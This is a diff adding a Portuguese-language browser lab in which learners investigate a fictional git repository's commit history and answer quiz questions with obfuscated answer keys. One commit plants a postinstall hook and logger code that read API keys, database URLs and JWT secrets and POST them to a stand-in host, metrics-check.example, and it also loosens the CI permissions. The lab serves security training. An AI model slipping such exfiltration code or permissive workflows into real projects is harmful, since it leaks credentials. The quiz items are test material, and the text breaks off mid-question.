+          Um commit inocente demais pode ser a maior ameaça.
+        </div>
+      </div>
+      
+      <div class="hint-section">
+        <div class="hint-title">Comandos sugeridos</div>
+        <div id="hint-chips"></div>
+      </div>
+
+      <div class="questions-section" id="questions-section">
+        <!-- Questions injected here -->
+      </div>
+
+      <div class="score-widget">
+        <div>
+          <div class="score-info">Score atual</div>
+          <div class="score-info" id="score-detail">0 corretas de 0 respondidas</div>
+        </div>
+        <div class="score-value" id="score-pct">0%</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- RESULTS SCREEN -->
+<div class="results-screen" id="results-screen">
+  <div id="results-icon" class="results-icon">🔍</div>
+  <h1 class="results-title" id="results-title">Investigação Concluída</h1>
+  <div class="results-subtitle" id="results-subtitle">Veja o relatório final do incidente</div>
+  
+  <div class="results-score-big" id="results-score-big">0%</div>
+  <div class="results-score-label" id="results-score-label">de acerto</div>
+  
+  <div class="results-stats">
+    <div class="stat-box">
+      <div class="stat-value" id="stat-correct">0</div>
+      <div class="stat-label">Corretas</div>
+    </div>
+    <div class="stat-box">
+      <div class="stat-value" id="stat-wrong">0</div>
+      <div class="stat-label">Erradas</div>
+    </div>
+    <div class="stat-box">
+      <div class="stat-value" id="stat-pct">0%</div>
+      <div class="stat-label">Score</div>
+    </div>
+  </div>
+
+  <div class="cert-form" id="cert-form" style="display:none">
+    <label>Seu nome para o certificado</label>
+    <input type="text" id="cert-name" placeholder="Ex: Fulana da Silva" style="margin-bottom:0"/>
+    <div style="margin-top:12px;display:flex;gap:8px;">
+      <button class="btn btn-primary" onclick="generateCert()" style="flex:1">Gerar Certificado PNG</button>
+    </div>
+  </div>
+
+  <canvas id="cert-canvas"></canvas>
+
+  <div class="results-actions">
+    <button class="btn btn-secondary" onclick="restartLab()">↩ Tentar Novamente</button>
+  </div>
+</div>
+
+<!-- TOAST -->
+<div class="toast" id="toast"></div>
+
+<script>
+// ============================================================
+// OBFUSCATION ENGINE — XOR + SALT
+// ============================================================
+const SALT = "gf_lab_2025_mariana";
+
+function xorStr(str, key) {
+  let out = '';
+  for (let i = 0; i < str.length; i++) {
+    out += String.fromCharCode(str.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+  }
+  return out;
+}
+
+function encode(str) { return btoa(xorStr(str, SALT)); }
+function decode(enc) { return xorStr(atob(enc), SALT); }
+
+// ============================================================
+// VIRTUAL GIT REPO
+// ============================================================
+const REPO = {
+  name: "fintech-auth-service",
+  commits: [
+    {
+      hash: "a3f9d2e",
+      fullHash: "a3f9d2e1b8c4f7a0d2e3b1c8f9a0d2e3b1c8f9a0",
+      author: "carlos.mendes",
+      email: "carlos.mendes@company.com",
+      date: "2024-11-28 09:14:33",
+      msg: "chore: update eslint config to v9",
+      files: [".eslintrc.json"],
+      diff: `diff --git a/.eslintrc.json b/.eslintrc.json
+index 2a3f8b1..9c4d2e0 100644
+--- a/.eslintrc.json
++++ b/.eslintrc.json
+@@ -1,6 +1,8 @@
+ {
+   "extends": ["eslint:recommended"],
+-  "rules": { "no-console": "warn" }
++  "rules": { "no-console": "off" },
++  "plugins": ["security"],
++  "env": { "node": true }
+ }`,
+      safe: true
+    },
+    {
+      hash: "b7c3a1f",
+      fullHash: "b7c3a1f4e9d8c2b1a3f7e9d8c2b1a3f7e9d8c2b1",
+      author: "ana.costa",
+      email: "ana.costa@company.com",
+      date: "2024-11-29 14:22:08",
+      msg: "feat: add user authentication middleware",
+      files: ["src/middleware/auth.ts", "src/types/user.d.ts"],
+      diff: `diff --git a/src/middleware/auth.ts b/src/middleware/auth.ts
+new file mode 100644
+index 0000000..f3a9b2c
+--- /dev/null
++++ b/src/middleware/auth.ts
+@@ -0,0 +1,28 @@
++import { Request, Response, NextFunction } from 'express';
++import jwt from 'jsonwebtoken';
++
++export function authMiddleware(req: Request, res: Response, next: NextFunction) {
++  const token = req.headers.authorization?.replace('Bearer ', '');
++  if (!token) return res.status(401).json({ error: 'Unauthorized' });
++  try {
++    const payload = jwt.verify(token, process.env.JWT_SECRET!);
++    req.user = payload;
++    next();
++  } catch {
++    return res.status(401).json({ error: 'Invalid token' });
++  }
++}`,
+      safe: true
+    },
+    {
+      hash: "c9e4b2d",
+      fullHash: "c9e4b2d7f1a3c5e7b9d1f3a5c7e9b1d3f5a7c9e1",
+      author: "dependabot[bot]",
+      email: "dependabot@github.com",
+      date: "2024-11-30 03:01:44",
+      msg: "chore(deps): bump axios from 1.6.2 to 1.6.5",
+      files: ["package.json", "package-lock.json"],
+      diff: `diff --git a/package.json b/package.json
+index 1a2b3c4..5d6e7f8 100644
+--- a/package.json
++++ b/package.json
+@@ -8,7 +8,7 @@
+   "dependencies": {
+     "express": "^4.18.2",
+-    "axios": "^1.6.2",
++    "axios": "^1.6.5",
+     "jsonwebtoken": "^9.0.2"
+   }
+ }`,
+      safe: true
+    },
+    {
+      hash: "d2f8a9c", // THE MALICIOUS COMMIT
+      fullHash: "d2f8a9c3e1b4d6f8a2c4e6b8d0f2a4c6e8b0d2f4",
+      author: "m.oliveira",
+      email: "m.oliveira@company.com",
+      date: "2024-12-01 11:33:19",
+      msg: "fix: add telemetry for performance monitoring",
+      files: ["package.json", "scripts/telemetry.js", "src/utils/logger.ts", ".github/workflows/ci.yml"],
+      diff: `diff --git a/package.json b/package.json
+index 5d6e7f8..9a0b1c2 100644
+--- a/package.json
++++ b/package.json
+@@ -3,10 +3,12 @@
+   "version": "2.4.1",
+   "scripts": {
+     "start": "node dist/index.js",
+     "build": "tsc",
+-    "test": "jest"
++    "test": "jest",
++    "postinstall": "node scripts/telemetry.js"
+   },
+   "dependencies": {
+     "express": "^4.18.2",
+     "axios": "^1.6.5",
+     "jsonwebtoken": "^9.0.2",
++    "analytics-node-pkg": "^0.0.3"
+   }
+ }
+
+diff --git a/scripts/telemetry.js b/scripts/telemetry.js
+new file mode 100644
+index 0000000..e4f5a6b
+--- /dev/null
++++ b/scripts/telemetry.js
+@@ -0,0 +1,18 @@
++// Performance telemetry collector
++// Collects anonymous usage metrics
++const os = require('os');
++
++async function collectMetrics() {
++  const payload = {
++    host: os.hostname(),
++    env: process.env.NODE_ENV,
++    token: process.env.API_KEY,
++    db_url: process.env.DATABASE_URL,
++    jwt: process.env.JWT_SECRET,
++    ts: Date.now()
++  };
++  await fetch("https://metrics-check.example/collect", {
++    method: "POST",
++    headers: { "Content-Type": "application/json" },
++    body: JSON.stringify(payload)
++  });
++}
++collectMetrics();
+
+diff --git a/src/utils/logger.ts b/src/utils/logger.ts
+index 7b8c9d0..1a2b3c4 100644
+--- a/src/utils/logger.ts
++++ b/src/utils/logger.ts
+@@ -1,12 +1,24 @@
+ import winston from 'winston';
++import axios from 'axios';
+ 
+ export const logger = winston.createLogger({
+   level: 'info',
+   transports: [new winston.transports.Console()]
+ });
++
++// Remote error tracking
++export async function trackError(err: Error, context: Record<string, string>) {
++  logger.error(err.message);
++  try {
++    await axios.post('https://metrics-check.example/errors', {
++      msg: err.message,
++      ctx: context,
++      auth: process.env.API_KEY,
++      secret: process.env.JWT_SECRET
++    });
++  } catch {}
++}
+
+diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
+index 3c4d5e6..7f8a9b0 100644
+--- a/.github/workflows/ci.yml
++++ b/.github/workflows/ci.yml
+@@ -1,14 +1,16 @@
+ name: CI
+-on: [push, pull_request]
++on:
++  push:
++  pull_request_target:
+ 
+ jobs:
+   build:
+     runs-on: ubuntu-latest
++    permissions:
++      contents: write
++      id-token: write
++      secrets: inherit
+     steps:
+       - uses: actions/checkout@v4
+       - run: npm ci
+       - run: npm test`,
+      safe: false,
+      malicious: true
+    },
+    {
+      hash: "e5a1c7b",
+      fullHash: "e5a1c7b3d9f2a4c6e8b0d2f4a6c8e0b2d4f6a8c0",
+      author: "ana.costa",
+      email: "ana.costa@company.com",
+      date: "2024-12-02 16:45:02",
+      msg: "feat: add rate limiting to auth endpoints",
+      files: ["src/middleware/rateLimiter.ts", "src/routes/auth.ts"],
+      diff: `diff --git a/src/middleware/rateLimiter.ts b/src/middleware/rateLimiter.ts
+new file mode 100644
+index 0000000..b2c3d4e
+--- /dev/null
++++ b/src/middleware/rateLimiter.ts
+@@ -0,0 +1,15 @@
++import rateLimit from 'express-rate-limit';
++
++export const authLimiter = rateLimit({
++  windowMs: 15 * 60 * 1000,
++  max: 10,
++  message: 'Too many attempts, please try again later'
++});`,
+      safe: true
+    }
+  ],
+
+  files: {
+    "package.json": `{
+  "name": "fintech-auth-service",
+  "version": "2.4.1",
+  "scripts": {
+    "start": "node dist/index.js",
+    "build": "tsc",
+    "test": "jest",
+    "postinstall": "node scripts/telemetry.js"
+  },
+  "dependencies": {
+    "express": "^4.18.2",
+    "axios": "^1.6.5",
+    "jsonwebtoken": "^9.0.2",
+    "analytics-node-pkg": "^0.0.3"
+  },
+  "devDependencies": {
+    "typescript": "^5.3.2",
+    "jest": "^29.7.0",
+    "eslint": "^9.0.0"
+  }
+}`,
+    "scripts/telemetry.js": `// Performance telemetry collector
+// Collects anonymous usage metrics
+const os = require('os');
+
+async function collectMetrics() {
+  const payload = {
+    host: os.hostname(),
+    env: process.env.NODE_ENV,
+    token: process.env.API_KEY,
+    db_url: process.env.DATABASE_URL,
+    jwt: process.env.JWT_SECRET,
+    ts: Date.now()
+  };
+  await fetch("https://metrics-check.example/collect", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(payload)
+  });
+}
+collectMetrics();`,
+    "src/utils/logger.ts": `import winston from 'winston';
+import axios from 'axios';
+
+export const logger = winston.createLogger({
+  level: 'info',
+  transports: [new winston.transports.Console()]
+});
+
+// Remote error tracking
+export async function trackError(err: Error, context: Record<string, string>) {
+  logger.error(err.message);
+  try {
+    await axios.post('https://metrics-check.example/errors', {
+      msg: err.message,
+      ctx: context,
+      auth: process.env.API_KEY,
+      secret: process.env.JWT_SECRET
+    });
+  } catch {}
+}`,
+    "src/middleware/auth.ts": `import { Request, Response, NextFunction } from 'express';
+import jwt from 'jsonwebtoken';
+
+export function authMiddleware(req: Request, res: Response, next: NextFunction) {
+  const token = req.headers.authorization?.replace('Bearer ', '');
+  if (!token) return res.status(401).json({ error: 'Unauthorized' });
+  try {
+    const payload = jwt.verify(token, process.env.JWT_SECRET!);
+    req.user = payload;
+    next();
+  } catch {
+    return res.status(401).json({ error: 'Invalid token' });
+  }
+}`,
+    ".github/workflows/ci.yml": `name: CI
+on:
+  push:
+  pull_request_target:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+      id-token: write
+      secrets: inherit
+    steps:
+      - uses: actions/checkout@v4
+      - run: npm ci
+      - run: npm test`,
+    ".eslintrc.json": `{
+  "extends": ["eslint:recommended"],
+  "rules": { "no-console": "off" },
+  "plugins": ["security"],
+  "env": { "node": true }
+}`,
+    "src/middleware/rateLimiter.ts": `import rateLimit from 'express-rate-limit';
+
+export const authLimiter = rateLimit({
+  windowMs: 15 * 60 * 1000,
+  max: 10,
+  message: 'Too many attempts, please try again later'
+});`,
+  }
+};
+
+// ============================================================
+// QUESTIONS (answers and complete feedback obfuscated with XOR + SALT)
+// ============================================================
+const ENCODED_ANSWERS = [
+    "DwQtHA4LOAo=",
+    "AAAmCxYVLlE=",
+    "FQM0VBEJbEs=",
+    "VhwnAwhUalQ=",
+    "UQppCxVUMlg=",
+    "FlFuAlkPK0g=",
+    "UghnBVUSawI=",
+    "FwNtVQYGZ1M=",
+    "XwIqCAVWaQU=",
+    "VBM6DVIFOgo=",
+    "FRUxGg8TaQc=",
+    "Vg88GBkBKFw=",
+    "EBIwAwMPJUQ=",
+    "BFc+W1kPJwM=",
+    "VhNsXlMMaQY=",
+    "BgFuAw1VbFY=",
+    "VQMsHBMUKgo=",
+    "HlZnVA5XMEA=",
+    "EhAmHlETOQY=",
+    "U1VuHhQSOUA="
+];
+
+const ENCODED_FEEDBACKS = [
+    "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"
+];
+
+// Questões equilibradas: todas as alternativas são plausíveis, mas apenas uma é a MAIS correta
+// pelo conjunto de evidências do repositório virtual. A resposta certa não fica como índice visível.
+function buildQuestions() {
+  return [
+    {
+        "phase": 1,
+        "text": "Depois de usar git log e git show nos commits recentes, qual evidência é a MAIS FORTE para tratar d2f8a9c como o ponto inicial do comprometimento?",
+        "options": [
+            {
+                "id": "hbrpoig8",
+                "text": "Ele altera telemetria, pacote, script de instalação e workflow no mesmo commit, conectando persistência, execução e possível exfiltração."
+            },
+            {
+                "id": "f1cbfno6",
+                "text": "Ele foi feito por um usuário humano em vez de um bot de dependências, o que aumenta a necessidade de revisão manual."
+            },
+            {
+                "id": "b9m80o2r",
+                "text": "Ele usa uma mensagem de commit genérica sobre monitoramento, o que pode indicar mudança operacional sensível."
+            },
+            {
+                "id": "ak1vrjnv",
+                "text": "Ele ocorre depois de um bump de axios e antes de uma feature de rate limit, portanto fica no meio da linha do tempo do incidente."
+            }
+        ],
+        "feedbackKey": 0
+    },
+    {
+        "phase": 1,
+        "text": "No package.json, qual mudança deve ser priorizada como evidência de execução automática do payload?",
+        "options": [
+            {
+                "id": "gfygwwqc",
+                "text": "A inclusão de um lifecycle hook postinstall chamando scripts/telemetry.js durante a instalação das dependências."
+            },
+            {
+                "id": "38hyf9sx",
+                "text": "A presença de uma dependência nova relacionada a analytics, porque pacotes de telemetria sempre precisam de validação."
+            },
+            {
+                "id": "mecosfog",
+                "text": "A atualização de scripts de build e test, pois qualquer mudança em scripts npm pode alterar o comportamento do pipeline."
+            },
+            {
+                "id": "yr3xkxwn",
+                "text": "A manutenção de axios nas dependências, porque bibliotecas HTTP permitem comunicação externa quando usadas pelo código."
+            }
+        ],
+        "feedbackKey": 1
+    },
+    {
+        "phase": 1,
+        "text": "Qual arquivo apresenta a evidência MAIS DIRETA de coleta de secrets para envio externo?",
+        "options": [
+            {
+                "id": "rek8pk3y",
+                "text": "scripts/telemetry.js, porque monta payload com process.env e envia para metrics-check.example/collect."
+            },
+            {
+                "id": "r9oudocu",
+                "text": "src/utils/logger.ts, porque envia dados para um endpoint remoto dentro de uma função de erro."
+            },
+            {
+                "id": "zrenun5z",
+                "text": "package.json, porque adiciona postinstall e dependência de analytics no fluxo de instalação."
+            },
+            {
+                "id": "3jqip98q",
+                "text": ".github/workflows/ci.yml, porque amplia as permissões e muda o gatilho de pull request."
+            }
+        ],
+        "feedbackKey": 2
+    },
+    {
+        "phase": 1,
+        "text": "Ao correlacionar os arquivos alterados, qual hipótese inicial fica MAIS sustentada?",
+        "options": [
+            {
+                "id": "1zxoi65f",
+                "text": "Um ataque de supply chain com execução por lifecycle hook, reforçado por pipeline permissivo e exfiltração de secrets."
+            },
+            {
+                "id": "dhjk1eyy",
+                "text": "Uma falha comum de logging, limitada ao excesso de contexto enviado para ferramenta de observabilidade interna."
+            },
+            {
+                "id": "37q9ah8r",
+                "text": "Uma atualização legítima de dependências que apenas introduziu ruído de telemetria sem impacto de segurança."
+            },
+            {
+                "id": "vhs1k3aq",
+                "text": "Um erro de configuração de lint que permitiu console logs em produção e reduziu a rastreabilidade."
+            }
+        ],
+        "feedbackKey": 3
+    },
+    {
+        "phase": 2,
+        "text": "No workflow de CI/CD, qual escolha aumenta MAIS o risco quando combinada com PRs e secrets?",
+        "options": [
+            {
+                "id": "6l6gt6mj",
+                "text": "pull_request_target, porque executa no contexto do repositório base e pode ter acesso a permissões e secrets sensíveis."
+            },
+            {
+                "id": "xk87au5b",
+                "text": "push, porque qualquer push dispara pipeline e pode executar testes com variáveis de ambiente."
+            },
+            {
+                "id": "hxtpdpff",
+                "text": "actions/checkout@v4, porque baixa o código no runner e torna os arquivos disponíveis para os jobs."
+            },
+            {
+                "id": "5e8ii49k",
+                "text": "npm test, porque executa código do projeto e pode acionar importações com efeitos colaterais."
+            }
+        ],
+        "feedbackKey": 4
+    },
+    {
+        "phase": 2,
+        "text": "A dependência analytics-node-pkg v0.0.3 é suspeita principalmente por qual motivo técnico?",
+        "options": [
+            {
+                "id": "q71n8mtz",
+                "text": "Ela aparece junto com postinstall e telemetria externa, compondo um padrão típico de pacote auxiliar usado para mascarar coleta."
+            },
+            {
+                "id": "x272hpoe",
+                "text": "Ela possui nome relacionado a analytics, e qualquer pacote de analytics deve ser proibido em aplicações sensíveis."
+            },
+            {
+                "id": "vb9ooaed",
+                "text": "Ela usa versão 0.0.3, e versões iniciais são sempre maliciosas ou abandonadas por mantenedores legítimos."
+            },
+            {
+                "id": "oecve6pr",
+                "text": "Ela foi adicionada após um bump de axios, o que normalmente indica dependency confusion em lockfile."
+            }
+        ],
+        "feedbackKey": 5
+    },
+    {
+        "phase": 2,
+        "text": "Qual endpoint deve ser tratado como IOC primário deste incidente?",
+        "options": [
+            {
+                "id": "5n8i4p40",
+                "text": "https://metrics-check.example/collect, por receber o payload com secrets no telemetry.js."
+            },
+            {
+                "id": "mgg1w103",
+                "text": "https://metrics-check.example/errors, por aparecer no logger e receber contexto de erro."
+            },
+            {
+                "id": "dgdzvgpm",
+                "text": "https://api.company.com/metrics, por representar o padrão esperado de telemetria corporativa."
+            },
+            {
+                "id": "m82i1lr3",
+                "text": "https://logs.datadog.com/intake, por ser um destino comum de observabilidade em produção."
+            }
+        ],
+        "feedbackKey": 6
+    },
+    {
+        "phase": 2,
+        "text": "O que o git blame em src/utils/logger.ts ajuda a demonstrar com MAIS precisão?",
+        "options": [
+            {
+                "id": "pe29gd8a",
+                "text": "Quais linhas específicas de exfiltração foram introduzidas pelo commit d2f8a9c e atribuídas a m.oliveira."
+            },
+            {
+                "id": "fpk054nz",
+                "text": "Qual biblioteca HTTP do projeto tem mais vulnerabilidades conhecidas no ecossistema npm."
+            },
+            {
+                "id": "dkyayq3s",
+                "text": "Se o domínio remoto está ativo, resolvendo DNS e aceitando conexões HTTPS válidas."
+            },
+            {
+                "id": "195jmsnd",
+                "text": "Se a conta m.oliveira foi comprometida por phishing ou se agiu de forma intencional."
+            }
+        ],
+        "feedbackKey": 7
+    },
+    {
+        "phase": 3,
+        "text": "Qual comando é MAIS adequado para inspecionar rapidamente o conjunto completo de alterações do commit suspeito?",
+        "options": [
+            {
+                "id": "8dudd467",
+                "text": "git show d2f8a9c, porque exibe metadados e diff completo do commit escolhido."
+            },
+            {
+                "id": "kd6fleep",
